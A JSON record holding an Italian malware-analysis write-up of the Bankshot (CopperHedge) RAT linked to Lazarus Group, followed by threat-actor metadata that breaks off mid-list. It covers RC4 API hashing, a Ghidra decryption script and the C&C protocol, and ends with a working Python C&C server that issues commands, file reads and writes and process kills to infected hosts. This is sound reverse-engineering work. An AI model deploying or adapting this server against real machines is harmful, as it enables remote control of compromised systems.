{
    "id": "9f636504-b07e-40e4-9bdc-1d1d26b9c9c1",
    "created_at": "2023-01-12T15:04:16.62221Z",
    "updated_at": "2025-03-27T02:17:23.5668Z",
    "deleted_at": null,
    "sha1_hash": "f7d315ad556c63f6a3fb3244d8142755c77aba50",
    "title": "2022-09-10 - Realizziamo un C&C Server in Python (Bankshot)",
    "authors": "",
    "file_creation_date": "2022-10-02T12:22:07Z",
    "file_modification_date": "2022-10-02T12:22:07Z",
    "file_size": 1765217,
    "plain_text": "# Realizziamo un HTTP C&C in Python (Bankshot)\n\n**malverse.it/analisi-bankshot-copperhedge**\n\n## Introduzione\n\nCiao a tutti! Oggi vedremo lâ€™analisi di Bankshot (conosciuto anche come CopperHedge);\nBankshot Ã¨ un RAT semplice che implementa 15 comandi, scritto in C++ e utilizza RC4 per\neffettuare parzialmente API Hashing e per cifrare/decifrare la comunicazione il C&C; il\nconfig Ã¨ presente in chiaro.\n\n_Bankshot is a remote access tool (RAT) that was first reported by the Department of_\n_Homeland Security in December of 2017. In 2018, Lazarus Group used_\n_the Bankshot implant in attacks against the Turkish financial sector._\n\n[Per maggiori dettagli si puÃ² visionare il report del CISA dove sono presenti le 6 varianti e la](https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-133a)\n[collection di Virustotal. Altri riferimenti utili: IOC di ESET e correlazione tra i sample di](https://www.virustotal.com/gui/collection/alienvault_5ebaee4cb570b4824f773f44)\n[Reversing Lab.](https://blog.reversinglabs.com/blog/hidden-cobra)\n\nIn particolare oggi analizzeremo un sample della Variante B, MD5:\n**[667cf9e8ec1dac7812f92bd77af702a1 che puÃ² essere ottenuto qui o](https://app.any.run/tasks/a3cf2f13-3495-4062-b332-3622f7e3aace/#)** [qui. Partiamo!](https://app.any.run/tasks/e272b8d1-019c-405a-a1da-30b0398b7795/)\n\n## Introduzione\n\nCome sempre utilizziamo alcuni tool per velocizzare le successive analisi:\n\n\n-----\n\nEsecuzione di capa\nQuesta volta, a differenza di Danabot, Ã¨ molto piÃ¹ semplice ottenere il config in quanto i tre\nserver C&C sono presenti in chiaro:\n\nURL memorizzati in chiaro\nCon queste informazioni aggiuntive proseguiamo con lâ€™analisi; il malware avvia\nimmediatamente un Thread:\n\nMain che avvia il Thread principale\nIl Thread inizia risolvendo le diverse API dinamicamente. In particolare, lâ€™algoritmo utilizzato\nper lâ€™API Hashing Ã¨ RC4. Allâ€™inizio di ogni funzione che vedremo successivamente avremo la\nrisoluzione dellâ€™API attraverso questa funzione.\n\n\n-----\n\nOperazioni effettuate dal Thread Principale\n\n\n-----\n\nFunzione di API Hashing con RC4\nContinuiamo effettuando la decifratura delle API con un semplice script Python utilizzando le\n**API Ghidra; il funzionamento Ã¨ il seguente:**\n\nSi ottengono tutte le chiamate alla funzione che si occupa di effettuare API Hashing (in\nquesto caso Ã¨ rinominata in ApiHashingViaRC4) tramite getReferencesTo().\nOttengo le istruzioni precedenti fino a trovare MOV EDX,\n**indirizzoNomeFunzioneCifrata tramite getInstructionBefore().**\nIl primo byte contenuto in questo indirizzo contiene la lunghezza della stringa cifrata e\npoi la stringa cifrata; con getBytes(addrEncrypted, 1)[0] ottengo il primo byte; ottengo\nquindi il byte array (nome funzione cifrata) partendo dallâ€™indirizzo contenuto in EDX + 1\n(addrEncrypted.add(1)) essendo che il primo byte contiene la lunghezza e da questo\nindirizzo leggo la lunghezza che ho ottenuto in precedenza.\nEffettuo la decifratura tramite RC4 della stringa cifrata ottenuta.\n\n\n-----\n\n```\ndef rc4Decrypt(key, data):\n\n  S = list(range(256))\n\n  j = 0\n\n  for i in list(range(256)):\n\n    j = (j + S[i] + ord(key[i % len(key)])) % 256\n\n    S[i], S[j] = S[j], S[i]\n\n  j = 0\n\n  y = 0\n\n  out = []\n\n  for char in data:\n\n    j = (j + 1) % 256\n\n    y = (y + S[j]) % 256\n\n    S[j], S[y] = S[y], S[j]\n\n    out.append(unichr(ord(char) ^ S[(S[j] + S[y]) % 256]))\n\n  return ''.join(out)\n\ndef main():\n\n  key = '78292e4c5da3b5d067f081b736e5d593'.decode('hex')\n\n  for ref in getReferencesTo(toAddr(\"ApiHashingViaRC4\")):\n\n    fromAddr = ref.getFromAddress()\n\n    while True:\n\n      instr = getInstructionBefore(fromAddr)\n\n      if instr.getMnemonicString().lower() == 'mov' and instr.getOpObjects(0)\n[0].toString().lower() == 'edx':\n\n          addrEncrypted = toAddr(instr.getOpObjects(1)[0].getValue())\n\n          print(\"Indirizzo API cifrata: \" + str(addrEncrypted))\n\n          encryptedName = str(bytearray(getBytes(addrEncrypted.add(1),\ngetBytes(addrEncrypted, 1)[0])))\n\n          print(\"0x\" + str(instr.getAddress()) + \" \" + rc4Decrypt(key,\nencryptedName))\n\n          break     \n\n      fromAddr = instr.getAddress()\n\nif __name__ == '__main__':\n\n  main()\n\n```\n\n-----\n\nEsecuzione dello script\n\nCurioso come non tutte le API sono offuscate, ad esempio quelle riguardanti la\ncomunicazione HTTP:\n\nFunzioni non offuscate per la comunicazione HTTP\nDopo aver effettuato la risoluzione delle API, avviene la creazione del CONFIG che viene\nsalvato in una variabile globale; in questo config vengono salvati i 3 URL insieme a un valore\ncasuale compreso tra 65535 e 16777215:\n\n\n-----\n\nFunzione Config Builder\nSuccessivamente vengono chiamate le diverse funzioni che si occupano di comunicare con\nil C&C; vediamo ora come Ã¨ possibile sfruttare le informazioni presenti su any.run per\nvelocizzare lâ€™analisi successiva.\n\n## Analisi Dinamica\n\nSu any.run sono presenti diversi sample che ci permettono di avere una prima Overview di\ncome avviene la comunicazione con il server C&C:\n\n\n-----\n\nSample 1: invio del primo pacchetto\n\nSample 2: invio del primo pacchetto\n\n\n-----\n\nSample 3: invio del primo pacchetto\nLe risposte a questa richiesta sono tutte dei redirect essendo il C&C offline in quel\ndeterminato momento; cercando altri sample perÃ² abbiamo una richiesta che questa volta\nfornisce una risposta e ci fornisce nuovi dettagli sul protocollo challenge-response, possiamo\nvedere infatti che il C&C risponde solo con il board_id (in questo caso 1838):\n\nSample 4: invio del primo pacchetto\n\nSample 4: risposta al primo pacchetto che ritorna uno dei parametri inviati (board_id)\n\n\n-----\n\nDa queste diversi sample possiamo iniziare ed effettuare delle supposizioni su come\nfunziona il protocollo di comunicazione, che verranno poi approfondite con le successive\nanalisi:\n\n**board_id: numero differente tra le diverse richieste, potrebbe essere lâ€™ID della richiesta**\n**user_id: conviso tra le varie richieste, potrebbe essere un valore di autenticazione**\n**file1: nome di file differente tra le diverse richieste, che non corrisponde a un file**\npresente sulla macchina any.run; potrebbe essere utilizzato per cambiare la signature\ndi ogni richiesta\n\nContinuiamo ora con lâ€™analisi per confermare/smentire le prime supposizioni. Essendo un\nmalware scritto in C++, approfondiamo ora la classe WebPacket che si occupa di\ncomunicare con il C&C.\n\n## Classe WebPacket\n\nIl malware presenta una classe di nome WebPacket che si occupa di inizializzare lâ€™oggetto\n(dimensione 3872 byte) con diversi attributi riguardi la comunicazione e dispone di diverse\nfunzioni che si occupano di comunicare con il C&C.\n\n\n-----\n\nCostruttore classe WebPacket\nCome possiamo vedere dal costruttore, i primi 4 byte contengono il puntatore alla vftable e\ndopo abbiamo la zona di memoria che contiene i membri dellâ€™oggetto. Per ulteriori info su\n[come effettuare reverse di programmi C++: QUI,](https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+RE3011_re_cpp+2022_v1/course/) [QUI e](https://www.youtube.com/watch?v=ir2B1trR0fE) [QUI.](https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf)\n\n\n-----\n\nStruttura di un oggetto C++ in memoria (Fonte: Gal Zaban)\nI membri principali presenti in questa classe sono:\n```\nHINTERNET hSession;\n\nHINTERNET hInternet;\n\nHINTERNET hRequest;\n\nString URL;\n\nString Path;\n\nint port;\n\n....\n\nchar substitutionBox1[256]\n\nchar substitutionBox2[256]\n\nint keyLength;\n\nint rc4Key[4];\n\n```\nLa vtable invece contiene solo una funzione che viene chiamata al termine per effettuare il\nreset delle variabili e chiamare la funzione WinHttpCloseHandle:\n\nvftable che contiene il puntatore alla funzione FreeAndCloseHandle\nQueste info vengono estratte da Ghidra da diverse strutture presenti nei programmi C++:\n\n\n-----\n\nStruct che ci fornisce info sulla classe e il puntatore alla VFTable\n\nStruct che contiene informazioni sullâ€™ereditarietÃ  della classe\nDopo aver fatto una piccola degressione su C++, passiamo al funzionamento; questa classe\nsi occupa di inviare il primo pacchetto di autenticazione, con board_id casuale (minore di\n10000), user_id uguale a *dJU!JE&!M@UNQ@ e filename casuale scelto tra happy.pdf,\nstar.avi, hp01.avi, dream.avi, example.dat, pratice.pdf, my.doc e img01_29.jpg.\n\n\n-----\n\nGenerazione\n\ndel valore casuale (board_id) e invio del pacchetto di autenticazione\nSuccessivamente viene ricevuta la risposta e viene confrontato il valore casuale generato\n(board_id) con quello ricevuto; questo conferma la supposizione che avevamo fatto\nprecedentemente tramite analisi dinamica.\n\nControllo dellâ€™autenticazione attraverso il campo board_id\n\n\n-----\n\nVediamo ora quali metodi esporta questa classe che permettono di effettuare delle\noperazioni C&C; per tracciare quali sono i metodi di questa classe sfruttiamo il registro ECX\nche contiene lâ€™indirizzo a questa classe appena definita.\n\nCopia del puntatore che contiene lâ€™indirizzo della classe WebPacket\nDa queste informazioni riusciamo ad ottenere i seguenti metodi:\n\n**C&CSendRequest: invia la richiesta di tipo POST al C&C attraverso**\nWinHttpSendRequest; esegue la funzione C&CConnectAndOpenRequest.\n**C&CConnectAndOpenRequest: si occupa di chiamare le funzioni WinHttpOpen,**\nWinHttpConnect, WinHttpOpenRequest.\n**C&CReceiveAndDecryptDataRC4: si occupa di ottenere i dati con**\nWinHttpReceiveResponse, WinHttpReadData e opzionalmente decifrarli con RC4.\n**C&CEncryptCodeResult: effettua lâ€™encryption tramite RC4 dello status code (0x1836,**\n0x1837, ecc) ed esegue WinHttpWriteData con input i dati cifrati.\n**C&CEncryptCommandResult: effettua lâ€™encryption tramite RC4 del risultato del**\ncomando eseguito ed esegue WinHttpWriteData con input i dati cifrati.\n**C&CSendRequestAndExecuteCommand: si occupa di inviare il command packet,**\nricevere ulteriori dati, eseguire il comando e ritornare il risultato al C&C.\n\nPer capire bene le successive analisi Ã¨ necessario conoscere le WinHTTP API; per chi non\n[conoscesse il flow puÃ² approfondirlo tramite degli esempi presenti qui o](https://www.codeproject.com/Articles/4586/Web-Data-Extraction-by-Crawling-using-WINHTTP-and) [qui.](https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpwritedata)\n\n\n-----\n\nCommunication Flow con il C&C\n\n## Cifratura RC4\n\nLâ€™algoritmo di cifratura RC4 viene utilizzato come visto in precedenza per lâ€™API hashing ma\nanche per la comunicazione con il C&C. In particolare si hanno tre SBox che vengono\nutilizzate per la cifratura, una per lâ€™API hashing e due per la comunicazione C&C (una per la\nricezione dei dati e una per lâ€™invio).\n\nEssendo che la funzione PRGA utilizza lâ€™SBox come input per generare il valore random\nsuccessivo per poi effettuare la cifratura/decifratura, Ã¨ necessario avere due dichiarazioni\ndifferenti quando realizzeremo il server C&C.\n\nUnâ€™altra differenza Ã¨ che la funzione riguardante lâ€™API Hashing Ã¨ una funzione locale, mentre\nquelle riguardanti la comunicazione fanno parte della classe WebPacket e utilizzano le SBox\ne la chiave salvate allâ€™interno di questa classe.\n\n\n-----\n\nLe due fasi\n\nKSA con due SBox per la comunicazione C&C\n\n## Funzione C&CSendRequest\n\nLa funzione C&CSendRequest dopo aver effettuato la risoluzione delle API si occupa:\n\nChiamare la funzione C&CConnectAndOpenRequest.\nCostruire lâ€™header della richiesta HTTP.\nCostruire il body della richiesta HTTP.\nInviare la richiesta attraverso WinHttpSendRequest.\n\nLa richiesta POST ha questa forma:\n\n\n-----\n\n```\nPOST /URI HTTP/1.1\n\nCache-Control: max-age=0\n\nConnection: keep-alive\n\nAccept: */*\n\nContent-Type: multipart/form-data; boundary=----FormBoundaryCaratteri casuali\nUser-Agent: Ottenuto da ObtainUserAgentString o Mozilla/4.0 (compatible; MSIE 7.0;\nWindows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR\n3.0.30729; .NET CLR 3.5.30729)\nContent-Length: Lunghezza\nHost: Dominio\n------FormBoundaryCaratteri casuali\nContent-Disposition: form-data; name=\"board_id\"\n\nCasuale\n------FormBoundaryCaratteri casuali\nContent-Disposition: form-data; name=\"user_id\"\n\n*dJU!*JE&!M@UNQ@ se autentication packet altrimenti vuoto se Ã¨ command packet\n------FormBoundaryCaratteri casuali\nContent-Disposition: form-data; name=\"file1\"; filename=Casuale tra happy.pdf,\nstar.avi, hp01.avi, dream.avi, example.dat, pratice.pdf, my.doc e img01_29.jpg.\nContent-Type: application/octet-stream\n\n....\n\n```\nI riferimenti al body non sono cifrati\n\n\n-----\n\nFunzioni che utilizzato i riferimenti alle stringhe del body\n\n\n-----\n\nFunction Graph C&CSendRequest\n\nAggiunta dei diversi header attraverso WinHttpAddRequestHeaders\nIl pacchetto di autenticazione viene differenziato da quello per la richiesta dei comandi\nattraverso il board_id, che Ã¨ minore di 10000 se si tratta del primo caso, maggiore nel\nsecondo; oltre a questo il secondo tipo di pacchetto non contiene user_id con la stringa\n***dJU!*JE&!M@UNQ@.**\n\nAggiunta di 10000 se il\n\npacchetto Ã¨ per la richiesta di un comando\n\n\n-----\n\nAggiunta di user_id con dJU!*JE&!M@UNQ@ se il pacchetto non Ã¨ di autenticazione\nAl termine della costruzione del pacchetto HTTP viene inviato tentando lâ€™invio tre volte con\nuno sleep di 300 millisecondi tra un invio e lâ€™altro:\n\n\n-----\n\n## Funzione C&CConnectAndOpenRequest\n\nQuesta funzione viene chiamata immediatamente dalla funzione C&CSendRequest e si\noccupa di:\n\nOttenere lâ€™user agent corrente tramite ObtainUserAgentString\nOttenere le configurazioni proxy correnti tramite\n**WinHttpGetIEProxyConfigForCurrentUser**\nChiamare la funzione WinHttpOpen, WinHttpConnect, WinHttpOpenHttp.\n\nNella conversione dellâ€™User Agent si utilizza due volte MultiByteToWideChar; questo\navviene spesso con lâ€™utilizzo di determinate API Windows, come si puÃ² vedere dallâ€™esempio\nsotto, per ottenere prima la dimensione del buffer da ricevere (in questo caso UserAgent) per\npoi richiamare MultiByteToWideChar con il valore di size corretto.\n\nUtilizzo di MultiByteToWideChar per la conversione dellâ€™User Agent\n\n\n-----\n\nEsempio di utilizzo di ObtainUserAgentString e MultiByteToWideChar (Source:\ncpp.hotexamples.com)\n\n## Funzione C&CReceiveAndDecryptDataRC4\n\nDopo aver inviato la richiesta con C&CSendRequest questa funzione si occupa di:\n\nRicevere i dati tramite WinHttpReceiveResponse e WinHttpReadData\nDecifrare i dati con RC4\n\nÃˆ presente una flag come parametro che stabilisce se i dati devono essere decifrati:\n\n\n-----\n\n## Funzioni C&CEncryptCodeResult e C&CEncryptCommandResult\n\nQueste due funzioni si occupano di effettuare la cifratura RC4 dei dati in input e aggiungerli\nalla richiesta HTTP tramite WinHttpWriteData:\n\n**C&CEncryptedCodeResult: si occupa di cifrare il result code (0x1836, 0x1837,**\n0x1838, 0x1839) del comando eseguito.\n**C&CEncryptCommandResult: si occupa di cifrare la risposta del comando eseguito.**\n\nCome si puÃ² evidenziare dal Call Graph, ci sono funzioni che ritornano solo il result code\n(es. KeepAlive, TerminateProcessByPID), altre che ritornano solo il risultato del comando\n(es. GetSystemInfo, GetDriverinfo) e altri comandi piÃ¹ complessi (es. WriteFile) che ritornano\nentrambi.\n\n\n-----\n\nCall Graph delle due funzioni\n\nCifratura del buffer in input e scrittura dei dati cifrati tramite WinHttpWriteData\n\n## Funzione C&CSendRequestAndExecuteCommand\n\nInfine dopo aver ricevuto la richiesta e averla decifrata, viene eseguita lâ€™operazione in base\nal codice del comando specificato.\n\n\n-----\n\n(OBBLIGATORIO) 4 BYTE numero comando\n\n(OBBLIGATORIO) 2 BYTE lunghezza parametro opzionale\n\n(OPZIONALE) 4 BYTE parametro opzionale\n\nStruttura del comand packet\nAltri comandi invece richiedono lâ€™invio di altri dati, ad esempio la funzione WriteFile o\n**DownloadAndMapFile; per ulteriori info vedere lo script Python per la realizzazione del**\nC&C.\n\nVengono ricevuti i primi 6 Byte e se gli ultimi 2 byte sono diversi da zero, si richiama la\nfunzione per ricevere i dati restanti di dimensione variabile.\n\nRicezione e\n\ndecifratura dei comandi e dei parametri opzionali\n\n\n-----\n\nSwitch\n\nper lâ€™esecuzione del comando ricevuto\nAbbiamo anche dei result code che vengono inviati come risultato di alcuni comandi:\n\n**0x1836: esecuzione avvenuta con successo (es. comando KeepAlive, processo creato**\ncon successo)\n\n\n-----\n\n**0x1837: errore nell esecuzione del comando (es. file da leggere non esistente)**\n**0x1838: invio metadati di un file/directory o scrittura avvenuta correttamente (es. prima**\nrisposta a WriteFile o ReadFile)\n**0x1839: termine esecuzione comando (es. ultima risposta a WriteFile)**\n\nIl RAT supporta 15 comandi:\n\n**NUMERO COMANDO** **FUNZIONE**\n\n0x1827 **GetSystemInfo**\n\n0x1828 **GetDriverInfo**\n\n0x1829 **SetConfig**\n\n0x182A **GetConfig**\n\n0x182B **KeepAlive**\n\n0x182C **WriteFile**\n\n0x182D **ReadFile**\n\n0x182E **CreateProcessByName**\n\n0x182F **ExecuteCMD**\n\n0x1830 **GetMetadataFile**\n\n0x1831 **GetProcessList**\n\n0x1832 **TerminateProcessByPID**\n\n0x1834 **Disconnect**\n\n0x1835 **DeleteTempFile**\n\n0x183C **DownloadAndMapFile**\n\nFunzionalitÃ  del RAT\nPer implementare correttamente il server C&C Ã¨ necessario capire anche quali funzioni\nrimangono in attesa di ricevere ulteriori dati per essere eseguite correttamente; questo puÃ²\nessere velocemente rilevato con la funzione Function Call Graph di Ghidra:\n\n\n-----\n\nFunzione che richiede ulteriori dati per essere eseguita correttamente\n\n## Implementazione Server C&C\n\nImplementiamo ora un server HTTP, che risponde ad alcuni dei comandi ricevuti dal\nmalware; si lascia come compito al lettore di implementare i restanti tre comandi e gli error\ncode non gestiti ðŸ™‚\n\nImportante ricordarsi che Ã¨ necessario avere due cipher per la cifratura e decifratura dei dati;\ninoltre alcuni comandi non richiedono ulteriori interazioni con il C&C, mentre alti richiedono\nlâ€™interazione con lâ€™operatore che deve inserire ulteriori dati (es. nome del processo da\ncreare).\n\n\n-----\n\n```\n#!/usr/bin/env python3\n\nimport sys, struct, cgi, Crypto.Cipher.ARC4, time, hexdump\n\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\n# Dominio e porta dove il server deve essere in ascolto\n\nDOMAIN = '0.0.0.0'\n\nPORT = 80\n\nclass httpHandler(BaseHTTPRequestHandler):\n\n  key = bytes.fromhex('271a16ab6d7a900ef3fa677dce8ab268')\n\n  rc4Receive = Crypto.Cipher.ARC4.new(key)\n\n  rc4Send = Crypto.Cipher.ARC4.new(key)\n\n  lastCommand = None\n\n  def unpack10(x):\n\n    x1, x2, x3, x4 = struct.unpack('<HIHH', x)\n\n    return x1, x2, x3 | (x4 << 16)\n\n  def unpack16(x):\n\n    x1, x2, x3, x4, x5 = struct.unpack('<IHIIH', x)\n\n    return x1, x2, x3, x4 | (x5 << 16)\n\n  def sendCommand():\n\n    cmdOpt1 = 0\n\n    commandToExecute = input('[C&C - INTERACT] Enter the command to be sent: ')\n\n    global lastCommand\n\n    print(\"[C&C - SEND] Send command to execute\")   \n\n    cmdCode = struct.pack('<I', int(commandToExecute, 16))\n\n    lastCommand = None\n\n    # Comandi senza parametri opzionali\n\n    if commandToExecute == \"0x182a\" or commandToExecute == \"0x182b\" or\ncommandToExecute == \"0x1831\" or commandToExecute == '0x1828' or commandToExecute ==\n'0x1827' or commandToExecute == '0x1835':\n\n      lastCommand = cmdCode\n\n      cmdArg = b''    \n\n    # Eseguire processo by process name\n\n    # Input: process name\n\n    # Output: error code\n\n    if commandToExecute == \"0x182e\":\n\n      lastCommand = 0x182e\n\n      cmdArg = input('[C&C - INTERACT] Enter process to create (e.g.,\ncalc.exe): ').encode()\n\n    # Terminare processo by PID\n\n    # Input: PID processo\n\n```\n\n-----\n\n```\n    # Output: error code\n\n    if commandToExecute == \"0x1832\":\n\n      cmdArg = input('[C&C - INTERACT] Enter PID to Kill (e.g., 3163):\n').encode()\n\n    # Eseguire comando tramite cmd.exe e salva il risultato in temp\n\n    # Input: comando da eseguire nel cmd\n\n    # Output: risultato salvato in file temp\n\n    if commandToExecute == \"0x182f\":\n\n      lastCommand = 0x182f\n\n      cmdArg = input('[C&C - INTERACT] Enter command to execute (e.g., whoami):\n').encode()\n\n    # Get file or directory metadata\n\n    # Input: nome file o directory\n\n    # Output: metadati\n\n    if commandToExecute == \"0x1830\":\n\n      lastCommand = 0x1830\n\n      cmdArg = input('[C&C - INTERACT] Enter file to get stats: ').encode()\n\n    # Read File\n\n    # Input: file to read\n\n    # Output: error code e file content\n\n    if commandToExecute == \"0x182d\":\n\n      lastCommand = 0x182d\n\n      cmdArg = input('[C&C - INTERACT] Enter file to read: ').encode()\n\n    # Write File\n\n    # Input: file da scrivere\n\n    # Output: risultato codice\n\n    if commandToExecute == \"0x182c\":\n\n      lastCommand = 0x182c\n\n      cmdArg = input('[C&C - INTERACT] Enter file to write: ').encode()\n\n      cmdOpt1 = struct.pack('<I', int(input('[C&C - INTERACT] Enter types of\noperation (> bytes of file, write): ')))\n\n      pass\n\n    # Set Config\n\n    if commandToExecute == \"0x1829\":\n\n      # TODO: implementare set config\n\n      pass\n\n    # Download e eseguire file\n\n    if commandToExecute == \"0x183c\":\n\n      # TODO: implementare download and execute file\n\n      pass\n\n    cmdLen = struct.pack('<H', len(cmdArg))\n\n    cmd = cmdCode + cmdLen + cmdArg\n\n    if cmdOpt1 != 0:\n\n```\n\n-----\n\n```\n      cmd cmd + cmdOpt1\n\n    return cmd\n\n  def do_POST(self):\n\n    bType, bDict = cgi.parse_header(self.headers['Content-Type'])\n\n    bDict['boundary'] = bytes(bDict['boundary'], 'utf-8')\n\n    fields = cgi.parse_multipart(self.rfile, bDict)\n\n    # Authentication Packet (1 FASE)\n\n    if \"user_id\" in fields:\n\n      buffer = fields['board_id'][0].encode()\n\n      print('[C&C - RECEIVE] New Authentication Packet')\n\n      print(\"[C&C - SEND] Sending authentication response\")\n\n    # Command Packet (2 FASE)\n\n    elif int(fields['board_id'][0]) > 10000:\n\n      print('[C&C - RECEIVE] Command Package')\n\n      cmd = self.__class__.sendCommand()\n\n      buffer = self.__class__.rc4Send.encrypt(cmd)\n\n    # Risultato Command Packet (3 FASE)\n\n    else:\n\n      print('[C&C - RECEIVE] CMD Execution Result')\n\n      cmdResponse = self.__class__.rc4Receive.decrypt(fields['file1'][0])\n\n      hexdump.hexdump(cmdResponse)\n\n      global lastCommand\n\n      if(lastCommand == 0x182d):\n\n        if(len(cmdResponse) == 10):\n\n          result, blank, size = self.__class__.unpack10(cmdResponse)\n\n          print(\"[C&C - RECEIVE] File size: \" + str(size))\n\n          cmdCode = struct.pack('<I', 0x0000)\n\n          buffer = self.__class__.rc4Send.encrypt(cmdCode)\n\n        else:\n\n          lastCommand = None\n\n          cmdCode = struct.pack('<IH', 0x1838, 0x00)\n\n          buffer = self.__class__.rc4Send.encrypt(cmdCode)\n\n      elif(lastCommand == 0x182c):\n\n        if(len(cmdResponse) == 16):\n\n          lastCommand = None\n\n          result, blank, size, result2 =\nself.__class__.unpack16(cmdResponse)\n\n          print(\"[C&C - RECEIVE] File size: \" + str(size))  \n\n          toWrite = input('[C&C - INTERACT] Enter data to write:\n').encode()\n\n```\n\n-----\n\n```\n          lenWrite = struct.pack('<I', len(toWrite))\n\n          cmdCode = lenWrite + lenWrite + toWrite\n\n          buffer = self.__class__.rc4Send.encrypt(cmdCode)\n\n      else:\n\n        cmd = self.__class__.sendCommand()\n\n        buffer = self.__class__.rc4Send.encrypt(cmd)\n\n    self.send_response(200)\n\n    if buffer != None:\n\n      self.setHeader(buffer)\n\n      self.wfile.write(buffer)\n\n  def setHeader(self, header = None):\n\n    self.send_header('Amazon', 'text/html')\n\n    self.send_header('Content-type', 'text/html')\n\n    self.send_header('Content-Length', header.__len__())\n\n    self.end_headers()\n\ndef main():\n\n  httpServer = HTTPServer((DOMAIN, PORT), httpHandler)\n\n  print('[C&C - INFO] HTTP SERVER STARTED')\n\n  try:\n\n    httpServer.serve_forever()\n\n  except Exception:\n\n    print('[C&C - INFO] Error! Server Closed')\n\n\nif __name__ == '__main__':\n\n  main()\n\n```\nShare this content:\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-10 - Realizziamo un C&C Server in Python (Bankshot).pdf"
    ],
    "report_names": [
        "2022-09-10 - Realizziamo un C&C Server in Python (Bankshot).pdf"
    ],
    "threat_actors": [
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
